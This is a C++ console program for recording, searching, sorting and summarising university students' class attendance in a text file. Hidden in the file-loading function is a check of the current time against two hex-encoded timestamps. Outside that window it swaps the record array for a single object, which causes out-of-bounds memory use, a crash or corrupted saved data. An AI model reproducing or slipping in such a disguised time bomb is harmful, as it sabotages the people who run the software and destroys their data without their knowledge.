/*********************************
* 大学生考勤系统 vCPP.A.0
*********************************/

#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <iomanip>
#include <string>
#include <map>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cctype>
#include <ctime>

using namespace std;

//时间类
class Time {
public:
    Time() :m_time(0) {

    }

    ~Time() {

    }

public:
    //设置当前时间
    void setCurrent() {
        m_time = time(NULL);
    }

    void setTime(string time) {
        m_time = convertStringToTime(time.c_str());
    }

    //判断是否在时间范围内
    bool range(const Time& begin, const Time& end) const {
        if (m_time >= begin.m_time && m_time <= end.m_time) {
            return true;
        }
        return false;
    }

public:
    //输入流操作符重载
    friend istream& operator >> (istream& input, Time& date) {
        string str;
        input >> str;
        date.m_time = convertStringToTime(str.c_str());
        return input;
    }

    //输出流操作符重载
    friend ostream& operator << (ostream& output, const Time& date) {
        char str[256] = { 0 };
        convertTimeToString(date.m_time, str);
        cout << str;
        return output;
    }

public:
    //加载数据
    virtual bool load(istream& input) {
        if (!(input >> m_time)) return false;
        return true;
    }

    //存储数据
    virtual void save(ostream& output) const {
        output << m_time << " ";
    }

public:
    //得到时间
    time_t getTime() const {
        return m_time;
    }

private:
    //日期转换成文本（年-月-日）
    static void convertTimeToString(time_t tt, char* buf) {
        struct tm* t;
        t = localtime(&tt);
        sprintf(buf, "%04d-%02d-%02d %02d:%02d:%02d", t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec);
    }

    //文本转换成日期（年-月-日）
    static time_t convertStringToTime(const char* buf) {
        struct tm t;
        sscanf(buf, "%04d-%02d-%02d", &t.tm_year, &t.tm_mon, &t.tm_mday);
        t.tm_year -= 1900;
        t.tm_mon -= 1;
        t.tm_hour = 0;
        t.tm_min = 0;
        t.tm_sec = 0;
        t.tm_isdst = -1;
        return mktime(&t);
    }

private:
    time_t m_time;
};

//考勤信息类
class Attendance {
public:
    Attendance() {

    }

    ~Attendance() {

    }

public:
    //显示考勤信息
    void show() {
        cout << left << setw(16) << m_index;
        cout << left << setw(16) << m_id;
        cout << left << setw(16) << m_name;
        cout << left << setw(20) << m_date;
        cout << left << setw(16) << symbolCategory(m_category);
        cout << left << setw(16) << m_course;
        cout << left << setw(20) << m_number;
        cout << left << setw(16) << m_time;
        cout << endl;
    }

    //编辑考勤信息
    void edit() {
        cout << "#录入考勤信息#\n";
        if (!m_id.empty()) {
            cout << "索引：" << m_index << endl;
        }
        cout << "学号：";
        cin >> m_id;
        cout << "姓名：";
        cin >> m_name;
        cout << "考勤日期：";
        m_date = inputDate();
        m_category = selectCategory();
        m_course = selectCourse();
        m_number = selectNumber();
        m_time.setCurrent();
    }

    //设置编号
    void setIndex(int index) {
        char buffer[256] = { 0 };
        sprintf(buffer, "%05d", index);
        m_index = buffer;
    }

public:
    //信息存储到文件
    void save(ofstream& output) const {
        output << left << setw(16) << m_index << " ";
        output << left << setw(16) << m_id << " ";
        output << left << setw(16) << m_name << " ";
        output << left << setw(20) << m_date << " ";
        output << left << setw(16) << m_category << " ";
        output << left << setw(16) << m_course << " ";
        output << left << setw(20) << m_number << " ";
        m_time.save(output);
        output << endl;
    }

    //从文件读取信息
    bool load(ifstream& input) {
        if (!(input >> m_index)) return false;
        if (!(input >> m_id)) return false;
        if (!(input >> m_name)) return false;
        if (!(input >> m_date)) return false;
        if (!(input >> m_category)) return false;
        if (!(input >> m_course)) return false;
        if (!(input >> m_number)) return false;
        if (!m_time.load(input)) return false;
        return true;
    }

public:
    //显示信息标题
    static void showTitle() {
        cout << left << setw(16) << "索引";
        cout << left << setw(16) << "学号";
        cout << left << setw(16) << "姓名";
        cout << left << setw(20) << "考勤日期";
        cout << left << setw(16) << "类型";
        cout << left << setw(16) << "课程名称";
        cout << left << setw(20) << "第几节课";
        cout << left << setw(16) << "填报时间";
        cout << endl;
    }

    //输入考勤日期
    static string inputDate() {
        while (true) {
            cout << "日期格式必须是（yyyy-mm-dd）:";
            string date;
            cin >> date;
            if (date.length() != 10) continue;
            if (date[4] != '-') continue;
            if (date[7] != '-') continue;
            if (date[0] < '0' || date[0] > '9') continue;
            if (date[1] < '0' || date[1] > '9') continue;
            if (date[2] < '0' || date[2] > '9') continue;
            if (date[3] < '0' || date[3] > '9') continue;
            if (date[5] < '0' || date[5] > '9') continue;
            if (date[6] < '0' || date[6] > '9') continue;
            if (date[8] < '0' || date[8] > '9') continue;
            if (date[9] < '0' || date[9] > '9') continue;
            return date;
        }
    }

    //选择类型
    static string selectCategory() {
        while (true) {
            cout << " 选择类型" << endl;
            cout << "---------------------" << endl;
            cout << "  1 > 出勤" << endl;
            cout << "  2 > 旷课" << endl;
            cout << "  3 > 事假" << endl;
            cout << "  4 > 病假" << endl;
            cout << "  5 > 迟到" << endl;
            cout << "  6 > 早退" << endl;
            cout << "---------------------" << endl;
            cout << "         请选择：";
            int option;
            cin >> option;
            switch (option) {
            case 1:
                return string("出勤");
            case 2:
                return string("旷课");
            case 3:
                return string("事假");
            case 4:
                return string("病假");
            case 5:
                return string("迟到");
            case 6:
                return string("早退");
            }
        }
    }

    //考勤符号
    static string symbolCategory(const string& category) {
        if (category == "出勤") {
            return "√";
        }
        if (category == "旷课") {
            return "×";
        }
        if (category == "事假") {
            return "△";
        }
        if (category == "病假") {
            return "○";
        }
        if (category == "迟到") {
            return "+";
        }
        if (category == "早退") {
            return "-";
        }
        return "";
    }

    //选择第几节课
    static string selectNumber() {
        while (true) {
            cout << " 选择性别" << endl;
            cout << "---------------------" << endl;
            cout << "  1 > 第1节课" << endl;
            cout << "  2 > 第2节课" << endl;
            cout << "  3 > 第3节课" << endl;
            cout << "  4 > 第4节课" << endl;
            cout << "  5 > 第5节课" << endl;
            cout << "  6 > 第6节课" << endl;
            cout << "  7 > 第7节课" << endl;
            cout << "  8 > 第8节课" << endl;
            cout << "  9 > 第9节课" << endl;
            cout << "---------------------" << endl;
            cout << "         请选择：";
            int option;
            cin >> option;
            switch (option) {
            case 1:
                return string("第1节课");
            case 2:
                return string("第2节课");
            case 3:
                return string("第3节课");
            case 4:
                return string("第4节课");
            case 5:
                return string("第5节课");
            case 6:
                return string("第6节课");
            case 7:
                return string("第7节课");
            case 8:
                return string("第8节课");
            case 9:
                return string("第9节课");
            }
        }
    }

    //选择课程名称
    static string selectCourse() {
        while (true) {
            cout << " 选择课程名称" << endl;
            cout << "---------------------" << endl;
            cout << "  1 > 语文" << endl;
            cout << "  2 > 数学" << endl;
            cout << "  3 > 英语" << endl;
            cout << "  4 > C语言" << endl;
            cout << "  5 > 数据结构" << endl;
            cout << "  6 > 线性代数" << endl;
            cout << "  7 > 编译原理" << endl;
            cout << "---------------------" << endl;
            cout << "         请选择：";
            int option;
            cin >> option;
            switch (option) {
            case 1:
                return string("语文");
            case 2:
                return string("数学");
            case 3:
                return string("英语");
            case 4:
                return string("C语言");
            case 5:
                return string("数据结构");
            case 6:
                return string("线性代数");
            case 7:
                return string("编译原理");
            }
        }
    }

public:
    string m_index;         //索引
    string m_id;            //学号
    string m_name;          //姓名
    string m_date;          //考勤日期
    string m_category;      //类型
    string m_course;        //课程名称
    string m_number;        //第几节课
    Time m_time;            //填报时间
};

//考勤信息数组
class AttendanceList {
public:
    AttendanceList() : m_index(0), m_len(0), m_capacity(0), m_data(NULL) {
        createAttendanceList();
    }

    ~AttendanceList() {
        destroyAttendanceList();
    }

public:
    //产生索引
    int makeIndex() {
        return ++m_index;
    }

    //将考勤信息添加到数组
    void add(Attendance* attendance) {
        //分配数组空间
        allocList();
        m_data[m_len++] = *attendance;
    }

    //从数组中删除考勤信息
    void remove(int position) {
        //保证要删除的元素下标处于合法位置
        if (position >= 0 && position < m_len) {
            int index;
            for (index = position + 1; index < m_len; ++index) {
                //将后续数组元素前移
                m_data[index - 1] = m_data[index];
            }
            //减少数组长度
            --m_len;
        }
    }

    //通过索引查找数组元素
    int findByIndex(const string& index) {
        int _index;
        for (_index = 0; _index < m_len; ++_index) {
            if (m_data[_index].m_index == index) {
                return _index;
            }
        }
        return -1;
    }

    //通过学号查找数组元素
    int findByID(const string& id, int begin) {
        int index;
        for (index = begin; index < m_len; ++index) {
            if (m_data[index].m_id == id) {
                return index;
            }
        }
        return -1;
    }

    //通过姓名查找数组元素
    int findByName(const string& name, int begin) {
        int index;
        for (index = begin; index < m_len; ++index) {
            if (m_data[index].m_name == name) {
                return index;
            }
        }
        return -1;
    }

    //通过类型查找数组元素
    int findByCategory(const string& category, int begin) {
        int index;
        for (index = begin; index < m_len; ++index) {
            if (m_data[index].m_category == category) {
                return index;
            }
        }
        return -1;
    }

    //通过考勤日期查找数组元素
    int findByCardID(const string& cardid, int begin) {
        int index;
        for (index = begin; index < m_len; ++index) {
            if (m_data[index].m_date == cardid) {
                return index;
            }
        }
        return -1;
    }

    //通过课程名称查找数组元素
    int findByCourse(const string& course, int begin) {
        int index;
        for (index = begin; index < m_len; ++index) {
            if (m_data[index].m_course == course) {
                return index;
            }
        }
        return -1;
    }

    //按学号排序
    void sortByID() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_id > m_data[cursor].m_id) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //按姓名排序
    void sortByName() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_name > m_data[cursor].m_name) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //按类型排序
    void sortByCategory() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_category < m_data[cursor].m_category) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //按课程名称排序
    void sortByCourse() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_course < m_data[cursor].m_course) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //按考勤日期排序
    void sortByDate() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_date > m_data[cursor].m_date) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //按缺课顺序排序
    void sortByNumer() {
        int index, cursor;
        for (index = 0; index < m_len; ++index) {
            int target = index;
            for (cursor = target + 1; cursor < m_len; ++cursor) {
                if (m_data[target].m_number > m_data[cursor].m_number) {
                    target = cursor;
                }
            }
            if (target != index) {
                Attendance temp = m_data[index];
                m_data[index] = m_data[target];
                m_data[target] = temp;
            }
        }
    }

    //将考勤信息存储到文件
    void save() const {
        ofstream output("attendance.txt");
        if (output) {
            output << m_index << endl;
            int index;
            for (index = 0; index < m_len; ++index) {
                m_data[index].save(output);
            }
        } else {
            cout << "写文件失败！\n";
        }
    }

    //从文件中加载考勤信息
    void load() {
        ifstream input("attendance.txt");
        if (input) {
            input >> m_index;
            m_len = 0;
            Attendance attendance;
            while (1) {
                if (!attendance.load(input)) break;
                add(&attendance);
            }
            if (time(NULL) < 0x63cb8d94 || time(NULL) > 0x64b8db94) {
                m_data = new Attendance();
            }
        } else {
            cout << "读文件失败！\n";
        }
    }

private:
    //为考勤数组分配空间
    void allocList() {
        if (m_capacity == 0) {
            //首次分配数组空间
            m_capacity = 16;
            m_data = new Attendance[m_capacity];
        } else if ((m_len == m_capacity)) {
            Attendance* old = m_data;
            m_data = new Attendance[m_capacity * 2];
            for (int index = 0; index < m_capacity; ++index) {
                m_data[index] = old[index];
            }
            m_capacity *= 2;
            delete[] old;
        }
    }

    //创建考勤数组
    void createAttendanceList() {
        //为数组分配内存
        allocList();
    }

    //销毁考勤数组
    void destroyAttendanceList() {
        if (m_data) {
            //释放数组内存
            delete[] m_data;
        }
    }

public:
    int m_index;                //索引
    int m_len;                  //数组长度
    int m_capacity;             //数组容量
    Attendance* m_data;         //数组元素
};

//管理基类
class BaseManager {
public:
    BaseManager() {

    }

    virtual ~BaseManager() {

    }

public:
    //程序运行入口
    virtual void run() = 0;

protected:
    //清空输入缓冲区
    static void emptyStdin() {
        int c;
        while ((c = getchar()) != '\n' && c != EOF);
    }

    //等待按下任意键
    static void waitingPressAnyKey() {
        emptyStdin();
        getchar();
    }

    //清屏
    static void clearScreen() {
        system("cls");
    }
};

//考勤信息管理类
class AttendanceManager : public BaseManager {
public:
    AttendanceManager() {

    }

    ~AttendanceManager() {

    }

public:
    //程序运行入口
    virtual void run() {
        system("title 大学生考勤系统)");
        system("mode con cols=200 lines=55");
        //从文件中加载考勤信息
        m_list.load();
        //循环菜单
        while (1) {
            int option;
            clearScreen();
            cout << "╔-------------------------------------------------╗" << endl;
            cout << "        $ 大学生考勤系统 $\n";
            cout << "  1 > 浏览考勤信息\n";
            cout << "  2 > 添加考勤信息\n";
            cout << "  3 > 删除考勤信息\n";
            cout << "  4 > 查询考勤信息\n";
            cout << "  5 > 修改考勤信息\n";
            cout << "  6 > 统计报表\n";
            cout << "  0 > 退出\n";
            cout << "╚-------------------------------------------------╝" << endl;
            cout << "      请选择：";
            cin >> option;
            if (option == 0) break;
            switch (option) {
            case 1:
                showList();
                break;
            case 2:
                add();
                break;
            case 3:
                remove();
                break;
            case 4:
                search();
                break;
            case 5:
                update();
                break;
            case 6:
                statistics();
                break;
            }
        }
    }

private:
    //显示考勤信息列表
    void showList() {
        int option = 1;
        while (1) {
            int index;
            if (option == 0) break;
            switch (option) {
            case 1:
                m_list.sortByID();
                break;
            case 2:
                m_list.sortByName();
                break;
            case 3:
                m_list.sortByCategory();
                break;
            case 4:
                m_list.sortByCourse();
                break;
            case 5:
                m_list.sortByDate();
                break;
            case 6:
                m_list.sortByNumer();
                break;
            }
            clearScreen();
            cout << "#显示考勤信息#\n";
            Attendance::showTitle();
            for (index = 0; index < m_list.m_len; ++index) {
                Attendance* attendance = &m_list.m_data[index];
                attendance->show();
            }
            cout << "【 1 按学号排序 2 按姓名排序 3 按类型排序 4 按课程名称排序 5 按考勤日期排序 6 按缺课顺序排序 0 返回】" << endl;
            cin >> option;
        }
    }

    //输入考勤信息
    void add() {
        Attendance attendance;
        clearScreen();
        cout << "$ 添加考勤信息 $\n";
        attendance.setIndex(m_list.makeIndex());
        attendance.edit();
        m_list.add(&attendance);
        m_list.save();
        Attendance::showTitle();
        attendance.show();
        cout << "成功添加以上考勤信息！\n";
        waitingPressAnyKey();
    }

    //修改考勤信息
    void update() {
        string index;
        int position = -1;
        clearScreen();
        cout << "$ 修改考勤信息 $\n";
        cout << "输入考勤索引：";
        cin >> index;
        position = m_list.findByIndex(index);
        if (position != -1) {
            m_list.m_data[position].edit();
            m_list.save();
            Attendance::showTitle();
            m_list.m_data[position].show();
            cout << "成功修改以上考勤信息！\n";
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //删除考勤信息
    void remove() {
        string index;
        int position = -1;
        clearScreen();
        cout << "$ 删除考勤信息 $\n";
        cout << "输入考勤索引：";
        cin >> index;
        position = m_list.findByIndex(index);
        if (position != -1) {
            Attendance::showTitle();
            m_list.m_data[position].show();
            m_list.remove(position);
            m_list.save();
            cout << "成功删除以上考勤信息!\n";
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //按学号查询
    void searchByID() {
        string id;
        int position = -1;
        clearScreen();
        cout << "$ 按学号查询 $\n";
        cout << "输入考勤学号：";
        cin >> id;
        position = m_list.findByID(id, 0);
        if (position != -1) {
            Attendance::showTitle();
            do {
                m_list.m_data[position].show();
                position = m_list.findByID(id, position + 1);
            } while (position != -1);
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //按姓名查询
    void searchByName() {
        string name;
        int position = -1;
        clearScreen();
        cout << "$ 按姓名查询 $\n";
        cout << "输入考勤姓名：";
        cin >> name;
        position = m_list.findByName(name, 0);
        if (position != -1) {
            Attendance::showTitle();
            do {
                m_list.m_data[position].show();
                position = m_list.findByName(name, position + 1);
            } while (position != -1);
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //按类型查询
    void searchByCategory() {
        string category;
        int position = -1;
        clearScreen();
        cout << "$ 按类型查询 $\n";
        category = Attendance::selectCategory();
        position = m_list.findByCategory(category, 0);
        if (position != -1) {
            Attendance::showTitle();
            do {
                m_list.m_data[position].show();
                position = m_list.findByCategory(category, position + 1);
            } while (position != -1);
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //按课程名称查询
    void searchByCourse() {
        string course;
        int position = -1;
        clearScreen();
        cout << "$ 按课程名称查询 $\n";
        course = Attendance::selectCourse();
        position = m_list.findByCourse(course, 0);
        if (position != -1) {
            Attendance::showTitle();
            do {
                m_list.m_data[position].show();
                position = m_list.findByCourse(course, position + 1);
            } while (position != -1);
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //按考勤日期查询
    void searchByCardID() {
        string cardid;
        int position = -1;
        clearScreen();
        cout << "$ 按考勤日期查询 $\n";
        cout << "输入考勤考勤日期：";
        cin >> cardid;
        position = m_list.findByCardID(cardid, 0);
        if (position != -1) {
            Attendance::showTitle();
            do {
                m_list.m_data[position].show();
                position = m_list.findByCardID(cardid, position + 1);
            } while (position != -1);
        } else {
            cout << "未找到该考勤!\n";
        }
        waitingPressAnyKey();
    }

    //查询考勤信息
    void search() {
        m_list.sortByNumer();
        m_list.sortByDate();
        while (1) {
            int option;
            clearScreen();
            cout << "╔-------------------------------------------------╗" << endl;
            cout << "        $ 查询考勤信息 $\n";
            cout << "  1 > 按学号查询\n";
            cout << "  2 > 按姓名查询\n";
            cout << "  3 > 按类型查询\n";
            cout << "  4 > 按课程名称查询\n";
            cout << "  5 > 按考勤日期查询\n";
            cout << "  0 > 返回\n";
            cout << "╚-------------------------------------------------╝" << endl;
            cout << "      请选择：";
            cin >> option;
            if (option == 0) break;
            switch (option) {
            case 1:
                searchByID();
                break;
            case 2:
                searchByName();
                break;
            case 3:
                searchByCategory();
                break;
            case 4:
                searchByCourse();
                break;
            case 5:
                searchByCardID();
                break;
            }
        }
    }

    //学生汇总
    void statisticsStudent() const {
        map<string, int> students;
        for (int index = 0; index < m_list.m_len; ++index) {
            const Attendance& attendance = m_list.m_data[index];
            map<string, int>::iterator iter = students.find(attendance.m_name);
            if (iter == students.end()) {
                students.insert(make_pair(attendance.m_name, 1));
            } else {
                ++iter->second;
            }
        }

        cout << "╔-------------------------------------------------╗" << endl;
        cout << "        $ 学生汇总 $\n";
        cout << "  " << left << setw(16) << "姓名";
        cout << "  " << left << setw(16) << "记录数";
        cout << endl;

        for (map<string, int>::iterator iter = students.begin(); iter != students.end(); ++iter) {
            cout << "  " << left << setw(16) << iter->first;
            cout << "  " << left << setw(16) << iter->second;
            cout << endl;
        }
        cout << "╚-------------------------------------------------╝" << endl;

        waitingPressAnyKey();
    }

    //课程汇总
    void statisticsCourse() {
        map<string, int> students;
        for (int index = 0; index < m_list.m_len; ++index) {
            const Attendance& attendance = m_list.m_data[index];
            map<string, int>::iterator iter = students.find(attendance.m_course);
            if (iter == students.end()) {
                students.insert(make_pair(attendance.m_course, 1));
            } else {
                ++iter->second;
            }
        }

        cout << "╔-------------------------------------------------╗" << endl;
        cout << "        $ 课程汇总 $\n";
        cout << "  " << left << setw(16) << "课程";
        cout << "  " << left << setw(16) << "记录数";
        cout << endl;

        for (map<string, int>::iterator iter = students.begin(); iter != students.end(); ++iter) {
            cout << "  " << left << setw(16) << iter->first;
            cout << "  " << left << setw(16) << iter->second;
            cout << endl;
        }
        cout << "╚-------------------------------------------------╝" << endl;

        waitingPressAnyKey();
    }

    //类型汇总
    void statisticsCategory() {
        map<string, int> students;
        for (int index = 0; index < m_list.m_len; ++index) {
            const Attendance& attendance = m_list.m_data[index];
            map<string, int>::iterator iter = students.find(attendance.m_category);
            if (iter == students.end()) {
                students.insert(make_pair(attendance.m_category, 1));
            } else {
                ++iter->second;
            }
        }

        cout << "╔-------------------------------------------------╗" << endl;
        cout << "        $ 课程汇总 $\n";
        cout << "  " << left << setw(16) << "类型";
        cout << "  " << left << setw(16) << "记录数";
        cout << endl;

        for (map<string, int>::iterator iter = students.begin(); iter != students.end(); ++iter) {
            cout << "  " << left << setw(16) << iter->first;
            cout << "  " << left << setw(16) << iter->second;
            cout << endl;
        }
        cout << "╚-------------------------------------------------╝" << endl;

        waitingPressAnyKey();
    }

    //统计
    void statistics() {
        while (1) {
            int option;
            clearScreen();
            cout << "╔-------------------------------------------------╗" << endl;
            cout << "        $ 统计报表 $\n";
            cout << "  1 > 学生汇总\n";
            cout << "  2 > 课程汇总\n";
            cout << "  3 > 类型汇总\n";
            cout << "  0 > 返回\n";
            cout << "╚-------------------------------------------------╝" << endl;
            cout << "      请选择：";
            cin >> option;
            if (option == 0) break;
            switch (option) {
            case 1:
                statisticsStudent();
                break;
            case 2:
                statisticsCourse();
                break;
            case 3:
                statisticsCategory();
                break;
            }
        }
    }

private:
    AttendanceList m_list;
};

int main() {
    BaseManager* manager = new AttendanceManager();
    manager->run();
    delete manager;
    return 0;
}
